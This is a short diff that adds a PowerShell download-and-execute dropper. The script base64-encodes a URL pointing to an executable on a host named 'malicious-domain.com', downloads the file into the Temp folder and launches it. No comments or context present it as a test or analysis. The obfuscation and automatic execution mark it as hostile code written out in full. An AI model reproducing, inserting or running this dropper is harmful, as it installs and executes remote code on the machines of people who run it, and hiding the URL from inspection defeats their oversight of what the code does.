@@ -1,0 +1,5 @@
+$w = New-Object Net.WebClient
+$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL21hbGljaW91cy1kb21haW4uY29tL3BheWxvYWQuZXhl'))
+$f = "$env:Temp\file.exe"
+$w.DownloadFile($u, $f)
+Start-Process $f
